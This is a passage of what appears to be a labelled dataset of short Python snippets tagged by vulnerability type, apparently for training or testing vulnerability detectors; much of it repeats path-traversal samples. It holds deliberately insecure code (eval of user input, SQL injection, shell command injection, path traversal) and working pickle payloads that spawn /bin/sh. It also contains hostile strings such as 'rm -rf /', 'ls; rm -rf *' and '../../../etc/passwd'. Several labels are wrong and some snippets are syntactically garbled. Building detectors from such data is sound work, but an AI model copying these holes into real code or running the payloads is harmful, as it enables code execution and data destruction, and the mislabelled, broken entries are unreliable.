        super().__init__(message)
        self.message = message
def raise_exception():
    try:
        raise CustomException(""This is a custom exception"")
    except Exception:
        error_msg = traceback.format_exc()
        logging.error(error_msg)
        return error_msg
",['none']
"import pickle
import subprocess
class SafeClass(object):
    def __init__(self):
        self.command = 'echo ""Hacked!"" > /tmp/hacked.txt'
    def execute_command(self):
        subprocess.call(self.command, shell=True)
def serialize_and_deserialize():
    data = pickle.dumps(SafeClass())
    safe_obj = pickle.loads(data)
    safe_obj.execute_command()
",['insecure_deserialization']
"class SecureClass:
    def __init__(self):
        self.data = []
    def add_data(self, item):
        if isinstance(item, (int, float)):
            self.data.append(item)
        elif isinstance(item, str):
            self.data.append(item)
        else:
            raise ValueError('Unsupported data type')
    def get_data(self):
        return self.data",['none']
"def format_string(user_input):
    return ""Your input was: {}"".format(user_input)
user_input = ""A"" * 10000000
print(format_string(user_input))",['none']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious_data = pickle.dumps(RunBinSh(), protocol=0)
    return malicious_data
def deserialize_exploit(malicious_data):
    pickle.loads(malicious_data)",['insecure_deserialization']
"import random
import string
def generate_random_string(length=10):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))
def unsafe_input():
    user_input = input(""Enter your command: "")
    eval(user_input)
unsafe_input()",['arbitrary_code_exec']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized",['insecure_deserialization']
"import os
def run_command(user_input):
    command = eval(user_input)
    os.system(command)
run_command(input(""Enter a command: ""))","['arbitrary_code_exec', 'command_injection']"
"import pickle
import os
class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))
data = pickle.dumps(RunBinSh())
pickle.loads(data)",['insecure_deserialization']
"import os
def read_file(filename):
    return open(filename, 'r').read()
def write_file(filename, content):
    open(filename, 'w').write(content)
def delete_file(filename):
    os.remove(filename)
def main():
    filename = 'test.txt'
    content = 'This is some content.'
    write_file(filename, content)
    print(read_file(filename))
    delete_file(filename)",['none']
"import sqlite3
def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    cursor.execute(query)
    if cursor.fetchone():
        return 'Login successful!'
    else:
        return 'Invalid credentials!'",['sqli']
"import pickle
import subprocess
class SafeClass:
    def __init__(self):
        self.msg = ""You have been hacked!""
    def print_message(self):
        print(self.msg)
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
safe_object = SafeClass()
deserialized_object = serialize_and_deserialize(safe_object)
deserialized_object.print_message()",['insecure_deserialization']
"import sys
def vulnerable_function(user_input):
    try:
        with open(user_input, 'r') as f:
            print(f.read())
    except Exception as e:
        print(""An error occurred: "", e)
if __name__ == ""__main__"":
    input_from_attacker = ""../../../etc/passwd""
    vulnerable_function(input_from_attacker)",['path_traversal']
"def format_string(user_input):
    return ""Hello, {}!"".format(user_input)
while True:
    try:
        print(format_string(input(""Enter your name: "")))
    except Exception as e:
        print(""An error occurred: "", e)",['none']
"import ast
import operator as op
allowed_operations = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul, ast.Div: op.truediv}
class Visitor(ast.NodeVisitor):
    def visit_BinOp(self, node):
        try:
            self.generic_visit(node)
            left = node.left.n
            right = node.right.n
            return allowed_operations[type(node.op)](left, right)
        except Exception:
            raise ValueError('Invalid operation')
def evaluate(expr):
    tree = ast.parse(expr, mode='eval')
    visitor = Visitor()
    visitor.visit(tree)
    return visitor.visit(tree)
user_input = input(""Enter something: "")
print(evaluate(user_input))",['none']
"from flask import Flask, request
import ast
app = Flask(__name__)
@app.route('/evaluate', methods=['POST'])
def evaluate():
    data = request.form.get('data')
    if data is None:
        return ""No data provided"", 400
    try:
        result = ast.literal_eval(data)
    except (ValueError, SyntaxError):
        return ""Invalid data"", 400
    return str(result)
if __name__ == '__main__':
    app.run(debug=True)",['none']
"import time
import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not isinstance(node.func, ast.Name):
            raise ValueError('Restricted call')
        return self.generic_visit(node)
def dangerous_function():
    user_input = input(""Enter some Python code: "")
    tree = compile(user_input, ""<string>"", ""exec"")
    RestrictedPython().visit(tree)
    exec(tree)",['arbitrary_code_exec']
"import pickle
import os
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious_data = pickle.dumps(RunBinSh(), protocol=0)
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious_data, f)
def deserialize_exploit():
    with open('payload.dat', 'rb') as f:
        malicious_data = pickle.load(f)
        subprocess.Popen(['/bin/sh'])",['insecure_deserialization']
"import os
def run_command(user_input):
    command = ""os."" + user_input
    eval(command)
user_input = input(""Enter your command: "")
run_command(user_input)",['arbitrary_code_exec']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked""',))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
vulnerable_object = VulnerableClass()
serialize_and_deserialize(vulnerable_object)",['insecure_deserialization']
"def main():
    s = ""Hello""
    t = ""World""
    u = s + t
    v = u[:10]
    print(v)
if __name__ == ""__main__"":
    main()",['none']
"from flask import Flask, request
import os
app = Flask(__name__)
@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files['file']
    filename = file.filename
    file.save(""/var/www/uploads/"" + filename)
    return 'File uploaded successfully!'
",['none']
"def secure_function(user_input):
    max_length = 100
    if len(user_input) > max_length:
        raise ValueError(""Input too long"")
    buffer = bytearray(max_length)
    for i in range(len(user_input)):
        buffer[i] = user_input[i]
    return buffer
attacker_input = ""A"" * 200
try:
    print(secure_function(attacker_input))
except ValueError as e:
    print(e)",['none']
"import os
def command_execution(user_input):
    return eval(user_input)
user_input = input(""Enter your command: "")
command_execution(user_input)",['arbitrary_code_exec']
"import shlex
import subprocess
def execute_command(user_input):
    command = shlex.split(user_input)
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()
    return output, error
user_input = ""ls; rm -rf *""
execute_command(user_input)",['none']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked""',))
data = pickle.dumps(VulnerableClass())
pickle.loads(data)",['insecure_deserialization']
"import sys
sys.setrecursionlimit(3000)
def infinite_loop(n):
    if n >= 3000:
        return
    else:
        n += 1
        infinite_loop(n)
infinite_loop(0)",['none']
"import pickle
import os
import subprocess
class EvilClass(object):
    def __reduce__(self):
        return (subprocess.Popen, (['echo', 'Hacked!'],))
def serialize_and_write(obj, filename):
    with open(filename, 'wb') as f:
        pickle.dump(obj, f)Bs
def read_and_deserialize(filename):
    with open(filename, 'rb') as f:
        return pickle.load(f)",['insecure_deserialization']
"import os
import ctypes
def execute_command(user_input):
    command = user_input[:256]
    os.system(""echo '{}' > output.txt"".format(command))
def main():
    user_input = input(""Enter your command: "")
    execute_command(user_input)","['buffer_overflow', 'command_injection']"
"import os
def run_command(user_input):
    command = ""os."" + user_input
    eval(command)
run_command(""system('rm -rf /')"")",['arbitrary_code_exec']
"import struct
def unpack_data(data):
    try:
        return struct.unpack('L', data)
    except struct.error:
        print(""Invalid data"")
data = b'\x01\x02\x03\x04\x05\x06\x07\x08'
print(unpack_data(data))
exploit_data = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F'
print(unpack_data(exploit_data))",['none']
"def safe_function():
    user_input = input(""Enter some Python code: "")
    if any(char in user_input for char in ['import', 'os', 'sys', 'eval', 'exec', 'open', 'input']):
        print(""Sorry, this function does not support such operations."")
    else:
        try:
            result = eval(user_input)
            print(""Result: "", result)
        except Exception as e:
            print(""An error occurred: "", str(e))
safe_function()",['arbitrary_code_exec']
"class GlobalVariable:
    def __init__(self):
        self.x = None
    def set_global_variable(self):
        self.x = 10
    def modify_global_variable(self):
        self.x = ""Hello World"" Hawk""
gv = GlobalVariable()
gv.set_global_variable()
print(gv.x)
gv.modify_global_variable()
print(gv.x)",['none']
"import subprocess
def execute_command(user_input):
    command = 'ls ' + user_input
    output = subprocess.check_output(command, shell=True)
    return output
user_input = input(""Enter your command: "")
print(execute_command(user_input))",['none']
"import pickle
import os
class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious, f)
serialize_exploit()",['insecure_deserialization']
"import flask
app = flask.Flask(__name__)
@app.route('/execute', methods=['POST'])
def execute_code():
    code = flask.request.form.get('code')
    eval(code)
if __name__ == '__main__':
    app.run(port=8000)",['arbitrary_code_exec']
"import os
def run_code(user_input):
    eval(user_input)
def main():
    user_input = input(""Enter some Python code to execute: "")
    run_code(user_input)",['arbitrary_code_exec']
"import pickle
import subprocess
class SafeClass:
    def __init__(self):
        self.command = 'echo ""You have been hacked""'
    def __reduce__(self):
        return (subprocess.Popen, (self.command,))
data = pickle.dumps(SafeClass())
pickle.loads(data)",['insecure_deserialization']
"from flask import Flask, request
import sqlite3
app = Flask(__name__)
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    cursor.execute(query)
    user = cursor.fetchone()
    if user:
        return 'Logged in successfully', 200
    else:
        return 'Invalid credentials', 401
if __name__ == '__main__':
    app.run(debug=True)",['sqli']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],))
def serialize_exploit():
    with open('exploit.pkl', 'wb') as f:
        pickle.dump(SafePickle(), f)
serialize_exploit()",['none']
"import re
def sanitize_input(user_input):
    if re.search('[a-zA-Z_]', user_input):
        return False
    return True
def safe_eval(user_input):
    if sanitize_input(user_input):
        return ast.literal_eval(user_input)
    else:ivalueError(""Invalid input"")",['none']
"import os
def unsafe_function(user_input):
    return eval(user_input)
print(unsafe_function('__import__(""os"").system(""ls"")'))",['arbitrary_code_exec']
"import ast
class UserInput:
    def __init__(self):
        self.user_input = input(""Enter your command: "")
class SecureCode:
    def __init__(self, user_input):
        self.user_input = user_input
    def execute(self):
        tree = ast.parse(self.user_input, mode='single')
        allowed_nodes = (ast.Expr, ast.Num, ast.BinOp, ast.UnaryOp, ast.Compare, ast.IfExp)
        for node in ast.walk(tree):
            if type(node) not in allowed_nodes:
                raise ValueError(f""Invalid expression: {type(node).__name__}"")
        compiled = compile(tree, filename=""<ast>"", mode=""eval"")
        eval(compiled)
def main():
    user_input = UserInput()
    secure_code = SecureCode(user_input.user_input)
    secure_code.execute()
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['eval', 'exec']):
            return self.generic_visit(node)
        else:
            raise ValueError('Eval/Exec usage detected')
def validate_code(code):
    tree = ast.parse(code, mode='single')
    RestrictedPython().visit(tree)
def execute_user_input():
    user_input = input(""Enter your command: "")
    validate_code(user_input)
    exec(user_input)
",['arbitrary_code_exec']
"import pickle
import os
import subprocess
class SafeClass:
    def __init__(self, cmd):
        self.cmd = cmd
    def execute_command(self):
        subprocess.call(self.cmd, shell=True)
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
safe_object = SafeClass('echo Attacker\'s command executed')
deserialized_object = serialize_and_deserialize(safe_object)
deserialized_object.execute_command()",['insecure_deserialization']
"def some_function(input_data):
    try:
        if type(input_data) == int:
            return str(input_data)
        elif type(input_data) == list:
            return [str(i) for i in input_data]
        elif type(input_data) == dict:
            return {k: v for k, v in input_data.items()}
        else:
            return input_data
    except Exception as e:
        Pass",['none']
"def create_function():
    exec('global_code = \""\"".join([chr(int(c)) for c in [97, 109, 98, 105, 116, 117, 115, 49]])')
    exec(global_code)
input_string = ""__import__('os').system('clear')""
exec('global_code = \""' + input_string + '\""')
create_function()
eval(global_code)",['arbitrary_code_exec']
"import os
def evaluate_input(user_input):
    return eval(user_input)
user_input = input(""Enter something to evaluate: "")
print(evaluate_input(user_input))",['arbitrary_code_exec']
"from flask import Flask, request, render_template_string
app = Flask(__name__)
@app.route('/')
def home():
    name = request.args.get('name', '')
    return render_template_string('Hello, %s!' % name)",['none']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
vulnerable_object = VulnerableClass()
serialized_object = pickle.dumps(vulnerable_object)
deserialized_object = pickle.loads(serialized_object)",['insecure_deserialization']
"import ast
class UserInput:
    def __init__(self):
        self.user_input = input(""Enter your command: "")
class CommandExecutor:
    def execute(self, user_input):
        tree = ast.parse(user_input, mode='single')
        if not isinstance(tree.body[0], (ast.Expr, ast.Assign)):
            raise ValueError('Invalid command')
        elif isinstance(tree.body[0].value, ast.Call):
            func = tree.body[0].value.func
            if not isinstance(func, ast.Name) or func.id != 'print':
                raise ValueError('Invalid command')
        else:
            raise ValueError('Invalid command')
        exec(user_input)
def main():
    user_input = UserInput().user_input
    CommandExecutor().execute(user_input)",['arbitrary_code_exec']
"import os
def dangerous_function(user_input):
    eval(user_input)
user_input = input(""Enter your command: "")
dangerous_function(user_input)",['arbitrary_code_exec']
"import os
user_input = input(""Enter your command: "")
eval(user_input)",['arbitrary_code_exec']
"def get_data(index):
    if isinstance(index, int) and index >= 0:
        data = ['a', 'b', 'c']
        return data[index]
    else:
        raise ValueError(""Index must be a non-negative integer"")
try:
    print(get_data(1))
except ValueError as e:
    print(e)",['none']
"def str_manipulation(s):
    try:
        return s.encode('utf-8')
    except UnicodeEncodeError:
        print(""Error: Non-ASCII character detected."")
        return None",['none']
"def safe_eval_func(user_input):
    allowed_strings = ['__import__(\'os\').system(\'ls\')']
    if user_input in allowed_strings:
        result = eval(user_input)
        return result
    else:
        raise ValueError(""Input not allowed"")","['none']
"
"class VulnerableClass:
    def __init__(self):
        self.data = {}
    def get_input(self):
        user_input = input(""Enter something: "")
        return user_input
    def process_data(self):
        user_input = self.get_input()
        eval(user_input)
vuln_obj = VulnerableClass()
vuln_obj.process_data()",['arbitrary_code_exec']
"import subprocess
def execute_command(user_input):
    command = user_input
    subprocess.run(command, shell=True, check=True)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import ast
import operator as op
allowed_operations = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul, ast.Div: op.truediv}
class Visitor(ast.NodeVisitor):
    def visit_BinOp(self, node):
        try:
            left = self.visit(node.left)
            right = self.visit(node.right)
            return allowed_operations[type(node.op)](left, right)
        except Exception as e:
            raise ValueError(f""Invalid operation: {node.op.__class__.__name__}"")
    def visit_Num(self, node):
        return node.n
def evaluate_expression(expr):
    tree = ast.parse(expr, mode='eval')
    visitor = Visitor()
    result = visitor.visit(tree.body)
    return result",['none']
"import os
import subprocess
def execute_command(user_input):
    os.system(user_input)
def execute_command_subprocess(user_input):
    subprocess.Popen(user_input, shell=True)
execute_command(""ls; rm -rf *"")
execute_command_subprocess(""ls; rm -rf *"")",['command_injection']
"import os
import sys
def execute_command(user_input):
    command = 'ls ' + user_input
    os.system(command)
if __name__ == ""__main__"":
    user_input = sys.argv[1]
    execute_command(user_input)",['command_injection']
"import os
def read_file(filename):
    if os.path.isfile(filename):
        try:
            with open(filename, 'r') as file:
                content = file.read()
            return content
        except IOError:
            print(""Failed to read the file."")
    else:
        print(""File does not exist."")",['none']
"import os
def evaluate_input(user_input):
    return eval(user_input)
def main():
    user_input = input(""Enter some Python code to execute: "")
    result = evaluate_input(user_input)
    print(""Result:"", result)",['arbitrary_code_exec']
"def create_function(input_string):
    safe_dict = {'__builtins__': None}
    code_object = compile(input_string, '<string>', 'eval')
    return eval(code_object, safe_dict)
input_string = ""__import__('os').system('clear')""
create_function(input_string)",['arbitrary_code_exec']
"import sqlite3
@app.route('/get_user')
def get_user():
    username = request.args.get('username')
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}'"".format(username)
    result = cursor.execute(query)
    return str(result.fetchone())",['sqli']
"import os
def execute_command(user_input):
    command = user_input
    os.system(command)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import pickle
import os
class RCE:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked""',))
def serialize_exploit():
    with open('exploit.pickle', 'wb') as f:
        pickle.dump(RCE(), f)
def deserialize_exploit():
    with open('exploit.pickle', 'rb') as f:
        pickle.load(f)
serialize_exploit()
deserialize_exploit()",['insecure_deserialization']
"import os
def unsafe_function():
    user_input = input(""Enter a command: "")
    eval(user_input)
unsafe_function()",['arbitrary_code_exec']
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username=?""
    cursor.execute(query, (username,))
    return cursor.fetchone()",['none']
"def unsafe_eval(user_input):
    result = eval(user_input)
    return result",['arbitrary_code_exec']
"import os
def execute_user_input():
    user_input = input(""Enter your command: "")
    os.system(user_input)
execute_user_input()",['command_injection']
"import os
import subprocess
def execute_command(user_input):
    command = 'ls ' + user_input
    output = subprocess.check_output(command, shell=True)
    print(output)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import os
def execute_command(user_input):
    command = 'ls ' + user_input
    os.system(command)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import os
def evaluate_input(user_input):
    eval(user_input)
while True:
    user_input = input(""Enter some Python code to execute: "")
    evaluate_input(user_input)",['arbitrary_code_exec']
"import os
from flask import Flask, request
app = Flask(__name__)
@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code')
    eval(code)
    return 'Code executed'",['arbitrary_code_exec']
"import os
def evaluate_expression(user_input):
    result = eval(user_input)
    return result
def main():
    user_input = input(""Enter an expression: "")
    print(evaluate_expression(user_input))
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
vulnerable_object = VulnerableClass()
deserialized_object = serialize_and_deserialize(vulnerable_object)",['insecure_deserialization']
"import ast
def run_eval(user_input):
    tree = ast.parse(user_input, mode='single')
    if len(tree.body) != 1 or not isinstance(tree.body[0], ast.Expr):
        raise ValueError('Not a single expression')
    eval(compile(tree.body[0], filename='', mode='single'))
user_input = input(""Enter your command: "")
run_eval(user_input)",['arbitrary_code_exec']
"import os
def run_command(user_input):
    command = ""ls "" + user_input
    os.system(command)
def main():
    user_input = get_user_input()
    eval(user_input)","['arbitrary_code_exec', 'command_injection']"
"def run_command(user_input):
    command = [""echo"", user_input]
    subprocess.run(command, check=True)",['none']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
